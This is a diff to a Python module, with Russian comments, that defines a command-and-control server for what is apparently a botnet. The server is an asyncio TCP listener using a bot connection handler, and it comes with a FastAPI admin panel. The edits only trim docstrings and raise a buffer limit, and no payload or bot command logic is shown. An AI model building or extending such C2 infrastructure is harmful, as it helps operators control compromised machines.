@@ -13,29 +13,18 @@ from backend import start_benchmark
 from ..API.api import run_fastapi_server
 from .ClientConnection import BotConnectionHandler
 
-
 class C2Server:
     """
     Класс управления центральным сервером (Command and Control).
-    
-    Схема сетевого взаимодействия:
-    [TCP Packet] -> BotConnectionHandler -> Обработка команд.
-    [HTTP Request] -> FastAPI -> Панель управления.
     """
 
     def __init__(self) -> None:
-        """Инициализация экземпляра сервера без запуска сетевых служб."""
+        """Инициализация экземпляра сервера."""
         self.server: Optional[asyncio.AbstractServer] = None
 
     async def start(self) -> None:
         """
         Запускает TCP сервер, API сервер и систему мониторинга.
-        
-        Последовательность запуска:
-        1. Регистрация обработчика соединений BotConnectionHandler.
-        2. Инициализация TCP Server на порту PORT.
-        3. Запуск FastAPI для веб-интерфейса.
-        4. Открытие браузера с панелью управления.
         """
         connection_handler: BotConnectionHandler = BotConnectionHandler()
 
@@ -45,7 +34,7 @@ class C2Server:
             PORT,
             reuse_address=True,
             backlog=1000,
-            limit=5242880
+            limit=10 * 1024 * 1024
         )
 
         logger.Log.info(f"[{self.__class__.__name__}] TCP Server started on {IP}:{PORT}")
@@ -57,7 +46,6 @@ class C2Server:
         start_benchmark(asyncio.get_running_loop())
 
         admin_panel_url: str = f"http://127.0.0.1:{API_PORT}/"
-
         logger.Log.info(f"[{self.__class__.__name__}] API Server launching at {admin_panel_url}")
 
         await asyncio.sleep(1)
@@ -75,9 +63,6 @@ class C2Server:
                 logger.Log.info(f"[{self.__class__.__name__}] Server stopped.")
 
 async def start_server() -> None:
-    """
-    Точка входа для запуска сервера.
-    Создает экземпляр C2Server и переводит его в состояние ожидания соединений.
-    """
+    """Точка входа для запуска сервера."""
     server_instance: C2Server = C2Server()
     await server_instance.start()
